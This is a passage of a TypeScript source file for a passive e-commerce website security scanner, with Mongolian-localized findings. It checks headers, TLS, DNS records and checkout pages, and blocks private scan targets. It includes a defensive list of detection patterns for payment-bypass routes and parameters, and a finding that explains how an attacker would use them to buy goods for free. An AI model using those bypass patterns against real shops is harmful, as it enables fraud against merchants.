    title: "SPF бүх серверт зөвшөөрөл олгож байна (+all)",
    impact: "Яаг юу болох вэ: +all гэдэг нь 'дэлхийн аль ч сервер таны нэрийн өмнөөс имэйл явуулж болно' гэсэн утга. Халдагч, спаммер, хэн ч info@mongolz.shop хаягаас имэйл явуулж болно. Таны домэйний нэр хүнд хурдан хамгийн муу жагсаалтад орж бүх имэйл spam хавтас руу явна.",
    recommendation: "+all-ийг -all болгоож, зөвхөн бодитой ашигладаг илгээх үйлчилгээнүүдийг л жагса.",
  },
  "spf-softfail": {
    title: "SPF soft-fail ашиглаж байна (~all)",
    impact: "Яаг юу болох вэ: ~all гэдэг нь 'зөвшөөрөгдөөгүй серверийн имэйлийг хүлээн авч болно, зөвхөн тэмдэглэ' гэсэн утга. Ихэнх сервер хуурамч имэйлийг дамжуулна. -all болгоход л зөвшөөрөгдөөгүй бүх имэйлийг хатуу татгалзана.",
    recommendation: "Бүх хуурмаг илгээх эх сурвалжийг жагссаны дараа -all (хатуу татгалзал) руу шилж.",
  },
  "caa-missing": {
    title: "CAA бичлэг олдсонгүй",
    evidence: "CAA бичлэг олдсонгүй.",
    impact: "Яаг юу болох вэ: CAA байхгүй тул аль ч Сертификатын байгууллага (CA) таны домэйнд сертификат олгож болно. Тэдний нэгнийх хакдагдвал таны нэрийн хуурамч сертификат гаргаж болно. Тэр хуурамч сертификатаар хэрэглэгчдэд 'аюулгүй' харагдах фишинг сайт үүсгэж мэдээллийг хулгайлах боломжтой болно.",
    recommendation: "Бодитой ашигладаг сертификатын байгууллагуудад зориулсан CAA бичлэг нэм.",
  },
};

export function normalizePublicUrl(input: string) {
  const withProtocol = /^[a-z][a-z\d+\-.]*:\/\//i.test(input)
    ? input
    : `https://${input}`;
  const url = new URL(withProtocol);

  if (!["http:", "https:"].includes(url.protocol)) {
    throw new Error("Only HTTP and HTTPS URLs can be scanned.");
  }

  url.hash = "";
  return url;
}

export async function assertPublicTarget(url: URL) {
  if (
    ["localhost", "0.0.0.0"].includes(url.hostname.toLowerCase()) ||
    url.hostname.endsWith(".local")
  ) {
    throw new Error("Local and private network targets are blocked.");
  }

  const records = await dns.lookup(url.hostname, { all: true });
  if (!records.length) {
    throw new Error("The hostname could not be resolved.");
  }

  const privateAddress = records.find((record) => isPrivateAddress(record.address));
  if (privateAddress) {
    throw new Error("This hostname resolves to a private network address.");
  }
}

export async function scanWebsite(
  url: URL,
  language: ReportLanguage = "mn",
): Promise<SecurityScanResult> {
  const started = Date.now();
  const [responseSignal, tlsSignal, browserSignal, dnsSignal] = await Promise.all([
    fetchHeadersAndHtml(url),
    inspectTls(url),
    inspectInBrowser(url),
    inspectDns(url.hostname),
  ]);

  const ecommerce = await inspectEcommerce(url, responseSignal.body);
  const rawFindings = buildFindings(
    responseSignal,
    tlsSignal,
    browserSignal,
    dnsSignal,
    ecommerce,
  );
  const findings = language === "mn" ? translateFindingsMn(rawFindings) : rawFindings;
  findings.sort(
    (a, b) => SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity),
  );
  const metrics = buildMetrics(
    findings,
    responseSignal,
    tlsSignal,
    browserSignal,
    dnsSignal,
    ecommerce,
  );
  const score = Math.max(
    0,
    Math.round(
      metrics.reduce((total, metric) => total + metric.score * metric.weight, 0) /
        metrics.reduce((total, metric) => total + metric.weight, 0),
    ),
  );

  const ai = await createAiReview(
    {
      url: url.toString(),
      finalUrl: responseSignal.finalUrl || browserSignal.finalUrl,
      status: responseSignal.status,
      tls: tlsSignal,
      dns: dnsSignal,
      metrics,
      findings,
      browser: browserSignal,
      ecommerce,
      note:
        "Active payment bypass, free purchase attempts, brute force, and exploit payloads were not performed. This is a safe public e-commerce posture review.",
    },
    language,
  );

  return {
    inputUrl: url.toString(),
    finalUrl: responseSignal.finalUrl || browserSignal.finalUrl,
    scannedAt: new Date().toISOString(),
    status: responseSignal.status,
    responseTimeMs: Date.now() - started,
    contentType: responseSignal.headers["content-type"] ?? null,
    headers: responseSignal.headers,
    tls: tlsSignal,
    dns: dnsSignal,
    browser: browserSignal,
    ecommerce,
    metrics,
    findings,
    score,
    grade: scoreToGrade(score),
    aiReview: ai.review,
    aiModel: ai.model,
    aiError: ai.error,
  };
}

async function fetchHeadersAndHtml(url: URL) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 20000);

  try {
    const response = await fetch(url, {
      redirect: "follow",
      signal: controller.signal,
      headers: {
        "User-Agent":
          "Mozilla/5.0 SecurityReviewBot/1.0 (+https://example.invalid/security-review)",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      },
    });

    const headers = Object.fromEntries(
      Array.from(response.headers.entries()).map(([key, value]) => [
        key.toLowerCase(),
        value,
      ]),
    );

    return {
      finalUrl: response.url,
      status: response.status,
      headers,
      body: await response.text().catch(() => ""),
    };
  } catch (error) {
    if (error instanceof Error) {
      if (error.name === "AbortError") {
        throw new Error("The site took too long to respond (20 s timeout).");
      }
      const cause = (error as { cause?: { code?: string } }).cause;
      if (cause?.code === "ENOTFOUND") {
        throw new Error(`Could not resolve hostname "${url.hostname}". Check the URL and try again.`);
      }
      if (cause?.code === "ECONNREFUSED") {
        throw new Error("Connection refused. The site may be down or blocking automated requests.");
      }
    }
    throw error;
  } finally {
    clearTimeout(timeout);
  }
}

async function inspectTls(url: URL): Promise<TlsSignal> {
  if (url.protocol !== "https:") {
    return emptyTls(false);
  }

  const port = Number(url.port || 443);

  return await new Promise((resolve) => {
    const socket = tls.connect(
      {
        host: url.hostname,
        port,
        servername: url.hostname,
        rejectUnauthorized: false,
        timeout: 15000,
      },
      () => {
        const cert = socket.getPeerCertificate();
        const cipher = socket.getCipher();
        resolve({
          enabled: true,
          authorized: socket.authorized,
          protocol: socket.getProtocol(),
          cipher: cipher?.name ?? null,
          validFrom: cert.valid_from ?? null,
          validTo: cert.valid_to ?? null,
          issuer: cert.issuer?.O ?? cert.issuer?.CN ?? null,
          subject: cert.subject?.CN ?? null,
        });
        socket.end();
      },
    );

    socket.on("timeout", () => {
      socket.destroy();
      resolve(emptyTls(true));
    });
    socket.on("error", () => resolve(emptyTls(true)));
  });
}

async function inspectDns(hostname: string): Promise<DnsSignal> {
  const root = hostname.replace(/^www\./i, "");
  const [mx, txt, dmarcTxt, caa] = await Promise.all([
    dns.resolveMx(root).catch(() => []),
    dns.resolveTxt(root).catch(() => []),
    dns.resolveTxt(`_dmarc.${root}`).catch(() => []),
    dns.resolveCaa(root).catch(() => []),
  ]);

  return {
    mx: mx.map((record) => `${record.exchange} (${record.priority})`),
    spf: txt.flat().find((entry) => entry.toLowerCase().startsWith("v=spf1")) ?? null,
    dmarc:
      dmarcTxt
        .flat()
        .find((entry) => entry.toLowerCase().startsWith("v=dmarc1")) ?? null,
    caa: caa.map((record) => {
      const value = record.issue ?? record.issuewild ?? record.iodef ?? "";
      return `${record.critical ? "critical " : ""}${value}`;
    }),
  };
}

async function getBrowserLaunchOptions() {
  // On Vercel/Lambda use the serverless-compatible Chromium build.
  // Locally fall back to a system Chrome (or CHROMIUM_PATH env override).
  const isLambda =
    !!process.env.AWS_LAMBDA_FUNCTION_VERSION ||
    process.env.VERCEL === "1" ||
    process.env.VERCEL_ENV != null;

  if (isLambda) {
    const chromium = (await import("@sparticuz/chromium")).default;
    return {
      args: chromium.args,
      defaultViewport: chromium.defaultViewport,
      executablePath: await chromium.executablePath(),
      headless: true as const,
    };
  }

  const localChrome =
    process.env.CHROMIUM_PATH ??
    (process.platform === "win32"
      ? "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
      : process.platform === "darwin"
        ? "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
        : "/usr/bin/google-chrome");

  return {
    headless: true as const,
    args: ["--no-sandbox", "--disable-setuid-sandbox"],
    executablePath: localChrome,
  };
}

async function inspectInBrowser(url: URL): Promise<BrowserSignal> {
  let browser: Awaited<ReturnType<typeof puppeteer.launch>> | undefined;
  try {
    const options = await getBrowserLaunchOptions();
    browser = await puppeteer.launch(options);
  } catch (error) {
    return {
      finalUrl: url.toString(),
      title: null,
      forms: 0,
      passwordInputs: 0,
      externalScripts: 0,
      inlineScripts: 0,
      mixedContent: [],
      consoleErrors: [
        `Browser launch failed: ${error instanceof Error ? error.message : "unknown error"}`,
      ],
      failedRequests: [],
    };
  }

  try {
    const page = await browser.newPage();
    const consoleErrors: string[] = [];
    const failedRequests: string[] = [];

    await page.setViewport({ width: 1366, height: 900 });
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36",
    );

    page.on("console", (message) => {
      if (message.type() === "error") {
        consoleErrors.push(message.text().slice(0, 240));
      }
    });

    page.on("requestfailed", (request) => {
      const errorText = request.failure()?.errorText ?? "failed";
      const reqUrl = request.url();
      // Next.js RSC prefetch aborts are expected client-side behaviour, not real errors
      if (errorText === "net::ERR_ABORTED" && /[?&]_rsc=/.test(reqUrl)) return;
      failedRequests.push(`${errorText}: ${reqUrl}`.slice(0, 240));
    });

    await page.goto(url.toString(), {
      waitUntil: "networkidle2",
      timeout: 30000,
    });

    return await page.evaluate(() => {
      const scripts = Array.from(document.scripts);
      const finalUrl = location.href;
      const securePage = location.protocol === "https:";
      const mixedContent = Array.from(
        document.querySelectorAll<HTMLImageElement | HTMLScriptElement | HTMLLinkElement>(
          "script[src], img[src], link[href]",
        ),
      )
        .map((element) => element.getAttribute("src") ?? element.getAttribute("href"))
        .filter((asset): asset is string => Boolean(asset))
        .filter((asset) => securePage && asset.startsWith("http://"))
        .slice(0, 12);

      return {
        finalUrl,
        title: document.title || null,
        forms: document.forms.length,
        passwordInputs: document.querySelectorAll('input[type="password"]').length,
        externalScripts: scripts.filter((script) => script.src).length,
        inlineScripts: scripts.filter((script) => !script.src).length,
        mixedContent,
        consoleErrors: [],
        failedRequests: [],
      };
    }).then((result) => ({
      ...result,
      consoleErrors: Array.from(new Set(consoleErrors)).slice(0, 10),
      failedRequests: Array.from(new Set(failedRequests)).slice(0, 10),
    }));
  } catch (error) {
    return {
      finalUrl: url.toString(),
      title: null,
      forms: 0,
      passwordInputs: 0,
      externalScripts: 0,
      inlineScripts: 0,
      mixedContent: [],
      consoleErrors: [
        error instanceof Error ? error.message : "Browser inspection failed.",
      ],
      failedRequests: [],
    };
  } finally {
    await browser?.close();
  }
}

async function inspectEcommerce(url: URL, homeHtml: string): Promise<EcommerceSignal> {
  const discovered = await discoverUrls(url, homeHtml);
  const pages = await Promise.all(
    discovered.slice(0, 14).map((pageUrl) => inspectPage(pageUrl)),
  );
  const allText = `${homeHtml}\n${pages.map((page) => page.scripts.join("\n")).join("\n")}\n${pages
    .map((page) => page.url)
    .join("\n")}`;
  const platform = detectNames(PLATFORM_HINTS, allText);
  const paymentProviders = Array.from(
    new Set(pages.flatMap((page) => page.providers).concat(detectNames(PROVIDERS, allText))),
  );
  const policies = {
    privacy: hasPageKind(pages, "policy", /privacy/i),
    terms: hasPageKind(pages, "policy", /terms|conditions|service/i),
    refund: hasPageKind(pages, "policy", /refund|return|cancel/i),
    contact: pages.some(
      (page) =>
        /contact/i.test(page.url) && page.status !== null && page.status < 400,
    ),
  };
  const lower = homeHtml.toLowerCase();
  const ecomSignals = [
    /add to cart|checkout|cart|sku|product|buy now|захиалах|сагс|төлөх|худалдан/i.test(
      homeHtml,
    ),
    pages.some(
      (page) =>
        ["cart", "checkout", "product"].includes(page.kind) &&
        page.status !== null &&
        page.status < 400,
    ),
    paymentProviders.length > 0,
    platform.length > 0,
  ];

  return {
    isLikelyEcommerce: ecomSignals.filter(Boolean).length >= 2,
    platform,
    paymentProviders,
    qpayDetected: paymentProviders.includes("QPay") || /\bqpay\b|qpay\.mn/i.test(lower),
    pagesChecked: pages,
    discoveredUrls: discovered.map((item) => item.toString()),
    policies,
    cookieConsent: /cookie|cookies|consent|privacy settings|tracking/i.test(homeHtml),
    checkoutPages: pages.filter(
      (page) => page.kind === "checkout" && page.status !== null && page.status < 400,
    ).length,
    cartPages: pages.filter(
      (page) => page.kind === "cart" && page.status !== null && page.status < 400,
    ).length,
    loginPages: pages.filter(
      (page) => page.kind === "login" && page.status !== null && page.status < 400,
    ).length,
    suspiciousCheckoutScripts: Array.from(
      new Set(
        pages
          .filter((page) => page.kind === "checkout")
          .flatMap((page) => {
            const pageHost = (() => {
              try { return new URL(page.url).hostname; } catch { return ""; }
            })();
            return page.scripts.filter((script) => isSuspiciousCheckoutScript(script, pageHost));
          }),
      ),
    ).slice(0, 12),
    riskyClientPaymentSignals: Array.from(
      new Set(pages.flatMap((page) => page.riskyClientPaymentSignals)),
    ).slice(0, 12),
    ...calculatePaymentBypassRisk(
      Array.from(new Set(pages.flatMap((page) => page.riskyClientPaymentSignals))),
      pages,
      paymentProviders,
    ),
    activePaymentBypassTested: false,
    activePaymentBypassNote:
      "The scanner does not attempt free purchases, payment bypass, brute force, or exploit payloads against live shops. It flags public client-side payment tampering signals and tells the owner where an authorized test is needed.",
  };
}

async function discoverUrls(base: URL, homeHtml: string) {
  const urls = new Map<string, URL>();
  const add = (candidate: string) => {
    try {
      const next = new URL(candidate, base);
      next.hash = "";
      if (next.hostname === base.hostname && ["http:", "https:"].includes(next.protocol)) {
        urls.set(next.toString(), next);
      }
    } catch {}
  };

  add(base.toString());
  KEY_PATHS.forEach(add);
  extractLinks(homeHtml).forEach(add);

  for (const sitemapUrl of ["/robots.txt", "/sitemap.xml"]) {
    const target = new URL(sitemapUrl, base);
    const text = await fetchText(target).catch(() => "");
    if (sitemapUrl === "/robots.txt") {
      text
        .split(/\r?\n/)
        .map((line) => line.match(/^sitemap:\s*(.+)$/i)?.[1])
        .filter((item): item is string => Boolean(item))
        .forEach(add);
    }
    extractLinks(text).forEach(add);
  }

  return Array.from(urls.values())
    .filter((item) => isUsefulEcommerceUrl(item) || item.toString() === base.toString())
    .slice(0, 22);
}

async function inspectPage(url: URL): Promise<PageSignal> {
  const response = await fetchHeadersAndHtml(url).catch(() => null);
  const html = response?.body ?? "";
  const scripts = extractScriptSources(html, url);
  const providers = detectNames(PROVIDERS, `${html}\n${scripts.join("\n")}`);
  const kind = classifyPage(url, html);
  const paymentInputs = countMatches(
    html,
    /name=["']?(card|cc|cvc|cvv|exp|expiry|amount|total|price|payment|invoice|qpay)|type=["']?(number|tel)/gi,
  );
  const riskyClientPaymentSignals = detectRiskyClientPaymentSignals(url, html);

  return {
    url: response?.finalUrl ?? url.toString(),
    status: response?.status ?? null,
    title: html.match(/<title[^>]*>([^<]+)<\/title>/i)?.[1]?.trim() ?? null,
    kind,
    https: (response?.finalUrl ? new URL(response.finalUrl) : url).protocol === "https:",
    forms: countMatches(html, /<form\b/gi),
    passwordInputs: countMatches(html, /type=["']?password/gi),
    paymentInputs,
    scripts,
    providers,
    riskyClientPaymentSignals,
  };
}

function buildFindings(
  response: Awaited<ReturnType<typeof fetchHeadersAndHtml>>,
  tlsSignal: TlsSignal,
  browser: BrowserSignal,
  dnsSignal: DnsSignal,
  ecommerce: EcommerceSignal,
) {
  const findings: Finding[] = [];
  const headers = response.headers;
  const finalUrl = new URL(response.finalUrl);

  if (finalUrl.protocol !== "https:") {
    findings.push(finding("no-https", "Page is not using HTTPS", "critical", "Transport", "The final page URL is HTTP.", "Visitors can have traffic read or changed in transit.", "Serve the site over HTTPS and redirect all HTTP traffic to HTTPS."));
  }

  if (tlsSignal.enabled && tlsSignal.authorized === false) {
    findings.push(finding("tls-invalid", "TLS certificate is not trusted", "critical", "Transport", "The TLS handshake completed, but Node did not authorize the certificate.", "Browsers may show a scary warning and attackers can impersonate the site.", "Install a valid certificate for this hostname and include the full certificate chain."));
  }

  if (tlsSignal.protocol && ["TLSv1", "TLSv1.1"].includes(tlsSignal.protocol)) {
    findings.push(finding("tls-old", "Old TLS protocol is enabled", "high", "Transport", `Negotiated protocol: ${tlsSignal.protocol}.`, "Old TLS versions have known weaknesses and may fail modern compliance checks.", "Disable TLS 1.0/1.1 and prefer TLS 1.2 or TLS 1.3."));
  }

  if (!headers["strict-transport-security"] && finalUrl.protocol === "https:") {
    findings.push(finding("missing-hsts", "Missing HSTS header", "medium", "Headers", "Strict-Transport-Security was not present.", "Returning visitors can still be downgraded to HTTP before the browser knows to force HTTPS.", "Add Strict-Transport-Security with a long max-age after confirming HTTPS works everywhere."));
  }

  if (!headers["content-security-policy"]) {
    findings.push(finding("missing-csp", "Missing Content Security Policy", "high", "Headers", "Content-Security-Policy was not present.", "A single script injection bug can become much easier to exploit.", "Add a restrictive CSP that allows only the scripts, styles, frames, and connections the app actually needs."));
  } else if (/\bunsafe-inline\b|\*/i.test(headers["content-security-policy"])) {
    findings.push(finding("weak-csp", "CSP allows risky sources", "medium", "Headers", headers["content-security-policy"], "Broad CSP sources reduce protection against cross-site scripting.", "Remove wildcards and unsafe-inline where possible; use nonces or hashes for required inline code."));
  }

  if (!headers["x-frame-options"] && !/frame-ancestors/i.test(headers["content-security-policy"] ?? "")) {
    findings.push(finding("clickjacking", "Missing clickjacking protection", "medium", "Headers", "No X-Frame-Options header or CSP frame-ancestors directive was found.", "Attackers can embed the page in another site and trick users into clicking hidden controls.", "Set CSP frame-ancestors or X-Frame-Options: DENY/SAMEORIGIN."));
  }

  if (headers["x-content-type-options"]?.toLowerCase() !== "nosniff") {
    findings.push(finding("no-nosniff", "Missing nosniff protection", "low", "Headers", "X-Content-Type-Options: nosniff was not present.", "Browsers may try to interpret files as a different content type.", "Set X-Content-Type-Options: nosniff."));
  }

  if (!headers["referrer-policy"]) {
    findings.push(finding("no-referrer-policy", "Missing referrer policy", "low", "Privacy", "Referrer-Policy was not present.", "Full URLs can leak to third-party sites through the Referer header.", "Set Referrer-Policy, commonly strict-origin-when-cross-origin."));
  }

  if (!headers["permissions-policy"]) {
    findings.push(finding("no-permissions-policy", "Missing browser permissions policy", "low", "Privacy", "Permissions-Policy was not present.", "Unused browser features remain available to embedded or compromised code.", "Set Permissions-Policy to disable camera, microphone, geolocation, and other unused features."));
  }

  const cookieHeader = headers["set-cookie"] ?? "";
  if (cookieHeader && !/;\s*secure/i.test(cookieHeader) && finalUrl.protocol === "https:") {
    findings.push(finding("cookie-secure", "Cookie missing Secure flag", "high", "Cookies", "At least one Set-Cookie header did not include Secure.", "Session cookies can be sent over HTTP if an HTTP endpoint exists.", "Add the Secure flag to authentication and state cookies."));
  }

  if (cookieHeader && !/;\s*httponly/i.test(cookieHeader)) {
    findings.push(finding("cookie-httponly", "Cookie missing HttpOnly flag", "medium", "Cookies", "At least one Set-Cookie header did not include HttpOnly.", "Injected JavaScript may be able to steal cookie values.", "Add HttpOnly to cookies that do not need browser JavaScript access."));
  }

  if (cookieHeader && !/;\s*samesite/i.test(cookieHeader)) {
    findings.push(finding("cookie-samesite", "Cookie missing SameSite flag", "low", "Cookies", "At least one Set-Cookie header did not include SameSite.", "Cookies without SameSite may be sent on cross-site requests, which increases CSRF risk.", "Add SameSite=Strict or SameSite=Lax to cookies that do not need cross-origin access."));
  }

  if (headers["x-powered-by"]) {
    findings.push(finding("x-powered-by", "Server technology disclosed via X-Powered-By", "low", "Headers", `X-Powered-By: ${headers["x-powered-by"]}`, "Knowing the specific framework version makes it easier to target known vulnerabilities.", "Remove or suppress the X-Powered-By header in your server or framework configuration."));
  }

  if (tlsSignal.validTo) {
    const expiresAt = new Date(tlsSignal.validTo);
    const daysLeft = Math.floor((expiresAt.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
    if (daysLeft < 30) {
      findings.push(finding(
        "cert-expiry-soon",
        `TLS certificate expires in ${daysLeft} day${daysLeft === 1 ? "" : "s"}`,
        daysLeft < 7 ? "critical" : "high",
        "Transport",
        `Certificate valid to: ${tlsSignal.validTo}`,
        "When the certificate expires visitors see a browser warning and HTTPS stops working.",
        "Renew the certificate before it expires; consider automated renewal with Let's Encrypt.",
      ));
    }
  }

  if (browser.passwordInputs > 0 && finalUrl.protocol !== "https:") {
    findings.push(finding("password-http", "Password field appears on an insecure page", "critical", "Forms", `${browser.passwordInputs} password input(s) were found on HTTP.`, "Credentials can be intercepted or modified in transit.", "Move login and account forms to HTTPS immediately."));
  }

  if (browser.mixedContent.length) {
    findings.push(finding("mixed-content", "HTTPS page loads HTTP assets", "high", "Browser", browser.mixedContent.join(", "), "Mixed content can be blocked by browsers or modified by attackers.", "Load all images, scripts, styles, and frames over HTTPS."));
  }

  if (browser.inlineScripts > 8 && !headers["content-security-policy"]) {
    findings.push(finding("inline-script-surface", "Large inline script surface without CSP", "medium", "Browser", `${browser.inlineScripts} inline script blocks were found.`, "Inline scripts make XSS containment harder when no CSP is present.", "Move inline scripts to bundled assets and use a CSP nonce/hash strategy."));
  }

  if (browser.consoleErrors.length || browser.failedRequests.length) {
    findings.push(finding("runtime-errors", "Browser runtime problems detected", "medium", "Reliability", [...browser.consoleErrors, ...browser.failedRequests].slice(0, 4).join(" | "), "Broken scripts and failed resources can disable security controls or important user flows.", "Fix failed browser requests and JavaScript errors found during page load."));
  }

  addEcommerceFindings(findings, ecommerce, dnsSignal, browser);

  const presentHeaders = SECURITY_HEADERS.filter((header) => headers[header]);
  findings.push(finding("header-coverage", "Security header coverage", "good", "Headers", `${presentHeaders.length}/${SECURITY_HEADERS.length} expected headers were present.`, "More complete browser security headers reduce common client-side attack paths.", "Keep security headers intentional and test them after every deployment."));

  return findings;
}

const SUSPICIOUS_ROUTE_CHECKS: [RegExp, string, string][] = [
  [
    /\/cart\/free|\/buy\/free|\/order\/free|\/checkout\/free/i,
    "free-purchase-route",
    "Free purchase route in browser signals",
  ],
  [
    /skip[_-]?payment|bypass[_-]?payment|skip[_-]?checkout/i,
    "skip-payment-param",
    "Payment skip/bypass keyword in browser signals",
  ],
  [
    /[?&](paid|payment_status|order_status)=(true|1|paid|complete|success)/i,
    "presigned-paid-url",
    "Pre-set paid/complete status in URL",
  ],
  [
    /[?&](amount|total|price)=0(&|$|")/i,
    "zero-amount-url",
    "Zero-amount order parameter in URL",
  ],
  [
    /[?&](discount|coupon)=100/i,
    "full-discount-url",
    "100% discount parameter in URL",
  ],
  [
    /\b(debug|test|mock)[_-]?payment\b/i,
    "debug-payment-exposed",
    "Debug/test payment endpoint visible publicly",
  ],
  [
    /\/admin\/(order|payment|checkout)/i,
    "admin-payment-exposed",
    "Admin order/payment endpoint appeared in browser",
  ],
  [
    /(qpay|payment|order)[^/\s]{0,30}(callback|confirm|success|verify)/i,
    "callback-url-exposed",
    "Payment callback URL structure visible in browser",
  ],
];

function detectSuspiciousRouteSignals(
  browser: BrowserSignal,
  ecommerce: EcommerceSignal,
): { label: string; examples: string[] }[] {
  const sources = [
    ...browser.consoleErrors,
    ...browser.failedRequests,
    ...ecommerce.discoveredUrls,
    ...ecommerce.pagesChecked.map((p) => p.url),
  ];

  const hits: { label: string; examples: string[] }[] = [];
  for (const [pattern, , label] of SUSPICIOUS_ROUTE_CHECKS) {
    const matched = sources.filter((s) => pattern.test(s)).slice(0, 2).map((s) => s.slice(0, 140));
    if (matched.length) {
      hits.push({ label, examples: matched });
    }
  }
  return hits;
}

function addEcommerceFindings(
  findings: Finding[],
  ecommerce: EcommerceSignal,
  dnsSignal: DnsSignal,
  browser: BrowserSignal,
) {
  const suspiciousRoutes = detectSuspiciousRouteSignals(browser, ecommerce);
  if (suspiciousRoutes.length) {
    const evidenceLines = suspiciousRoutes.map((h) => `${h.label}: ${h.examples.join(" | ")}`);
    findings.push(
      finding(
        "suspicious-payment-routes",
        "Exploit-ready payment routes detected in browser",
        "critical",
        "Payments",
        evidenceLines.join("\n"),
        "These URLs or patterns appeared in the browser during page load (console errors, failed requests, or links). An attacker who sees /cart/free/buy, skip_payment=1, amount=0, or a payment callback URL does the following: (1) opens the URL directly or modifies it in the browser bar, (2) submits the order without paying, (3) if the server does not validate payment status independently, the order is marked complete and goods are dispatched for free. Once working, the method is shared publicly within hours.",
        "1) Remove or 401-gate any route that skips payment (e.g. /cart/free). 2) Never accept payment status, amount, or order state from URL query parameters — always recalculate server-side. 3) Require server-side payment provider confirmation before marking any order complete. 4) Move debug/admin payment routes behind authentication and remove them from production. 5) Search your codebase for these patterns and audit every code path that touches order status.",
      ),
    );
  }

  const sensitiveInsecurePages = ecommerce.pagesChecked.filter(
    (page) =>
      !page.https &&
      ["checkout", "cart", "login"].includes(page.kind) &&
      (page.forms || page.passwordInputs || page.paymentInputs),
  );
  if (sensitiveInsecurePages.length) {
    findings.push(finding("ecom-insecure-sensitive-page", "Checkout, cart, or login page is not HTTPS", "critical", "E-commerce", sensitiveInsecurePages.map((page) => page.url).join(", "), "Customer credentials, addresses, and payment intent can be intercepted or changed.", "Force HTTPS for every cart, checkout, login, account, and payment URL."));
  }

  if (ecommerce.isLikelyEcommerce && ecommerce.checkoutPages === 0) {
    findings.push(finding("checkout-not-found", "Checkout page was not discovered", "medium", "E-commerce", `${ecommerce.pagesChecked.length} public pages were checked.`, "The scanner cannot confirm checkout safety if the checkout path is hidden, blocked, or only created after cart actions.", "Expose predictable checkout/cart paths or run an authenticated/manual checkout test for this site."));
  }

  if (ecommerce.isLikelyEcommerce && !ecommerce.paymentProviders.length) {
    findings.push(finding("payment-provider-not-found", "Payment provider was not detected", "medium", "Payments", "No Stripe, PayPal, Shopify, WooCommerce, QPay, MonPay, SocialPay, or similar payment signal was found.", "Customers may not know who handles payment, and custom payment flows need deeper manual review.", "Document the payment provider and keep sensitive card/payment handling on trusted PCI-compliant provider pages."));
  }

  if (ecommerce.qpayDetected) {
    findings.push(finding("qpay-detected", "QPay payment signal detected", "info", "Payments", "QPay strings, links, or scripts were found in public pages.", "QPay itself is normal for Mongolian e-commerce, but order status must be verified server-side after bank/payment confirmation.", "Confirm the backend verifies QPay invoice status server-side and never marks orders paid from browser-only callbacks or editable client values."));
  }

  if (ecommerce.riskyClientPaymentSignals.length) {
    findings.push(finding("client-payment-tamper-risk", "Client-side payment tampering signals found", ecommerce.paymentBypassRiskLevel === "critical" ? "critical" : "high", "Payments", `Risk ${ecommerce.paymentBypassRiskScore}/100 (${ecommerce.paymentBypassRiskLevel}). ${ecommerce.riskyClientPaymentSignals.join(" | ")}`, "If the server trusts browser-submitted amount, total, invoice, or paid status values, a buyer may change price or order state.", "Recalculate totals on the server, verify QPay/provider invoice status server-side, and ignore client-submitted paid/amount/order status fields."));
  } else if (ecommerce.isLikelyEcommerce) {
    findings.push(finding("payment-bypass-surface", "No obvious public payment-bypass signal found", "good", "Payments", `Risk ${ecommerce.paymentBypassRiskScore}/100 (${ecommerce.paymentBypassRiskLevel}). The public scan did not find editable paid/amount/order status signals.`, "This lowers obvious risk, but it does not prove checkout is safe because server logic and authenticated order flows are not visible publicly.", "Run an authorized staging checkout test: change client totals/status in DevTools, complete QPay sandbox flow, and verify the backend recalculates totals and confirms provider invoice status server-side."));
  }

  if (ecommerce.suspiciousCheckoutScripts.length) {
    findings.push(finding("checkout-third-party-scripts", "Unusual third-party scripts on checkout", "high", "Payments", ecommerce.suspiciousCheckoutScripts.join(", "), "Third-party code on checkout can observe customer details or interfere with payment flows.", "Allow only required analytics/payment scripts on checkout and enforce a strict checkout CSP."));
  }

  if (ecommerce.isLikelyEcommerce && !ecommerce.policies.privacy) {
    findings.push(finding("privacy-policy-missing", "Privacy policy was not found", "medium", "Trust", "No public privacy policy path/link was discovered.", "Customers may not know how personal data, addresses, phone numbers, and payment metadata are handled.", "Add a clear privacy policy linked from footer, checkout, and account pages."));
  }

  if (ecommerce.isLikelyEcommerce && !ecommerce.policies.refund) {
    findings.push(finding("refund-policy-missing", "Refund or return policy was not found", "medium", "Trust", "No refund/return/cancellation policy path/link was discovered.", "Payment disputes and customer support load increase when refund terms are unclear.", "Add refund, return, cancellation, and delivery terms near checkout and in the footer."));
  }

  if (ecommerce.isLikelyEcommerce && !ecommerce.cookieConsent) {
    findings.push(finding("cookie-consent-not-detected", "Cookie consent or tracking notice was not detected", "low", "Privacy", "No visible cookie/consent/tracking signal was found in public HTML.", "If analytics, ads, chat, or retargeting scripts run, visitors may not be informed.", "Add consent handling appropriate to the markets where the shop sells."));
  }

  if (!dnsSignal.mx.length && ecommerce.isLikelyEcommerce) {
    findings.push(finding("mx-missing", "No MX records found", "medium", "DNS", "The root domain has no MX record.", "Order emails, support replies, password resets, and dispute handling may fail or look suspicious.", "Configure reliable mail hosting and test order/support email delivery."));
  }

  if (!dnsSignal.spf && ecommerce.isLikelyEcommerce) {
    findings.push(finding("spf-missing", "SPF record was not found", "medium", "DNS", "No v=spf1 TXT record was found.", "Attackers can spoof shop emails more easily, hurting order trust and deliverability.", "Add SPF for all services that send mail for this domain."));
  }

  if (!dnsSignal.dmarc && ecommerce.isLikelyEcommerce) {
    findings.push(finding("dmarc-missing", "DMARC record was not found", "medium", "DNS", "No _dmarc TXT record was found.", "Fake order, invoice, and refund emails are harder for receivers to reject.", "Add DMARC, start with monitoring, then move toward quarantine or reject."));
  }

  if (dnsSignal.dmarc && /p=none/i.test(dnsSignal.dmarc)) {
    findings.push(finding("dmarc-not-enforced", "DMARC is in monitoring mode only (p=none)", "medium", "DNS", dnsSignal.dmarc, "Spoofed emails from your domain are not rejected by receiving mail servers — only reported.", "Move to p=quarantine then p=reject after reviewing DMARC aggregate reports for 2–4 weeks."));
  }

  if (dnsSignal.spf && /\+all/i.test(dnsSignal.spf)) {
    findings.push(finding("spf-allow-all", "SPF record allows any server to send email (+all)", "high", "DNS", dnsSignal.spf, "Any server on the internet can send email that appears to come from this domain.", "Replace +all with -all and list only the sending services you actually use."));
  } else if (dnsSignal.spf && /~all/i.test(dnsSignal.spf)) {
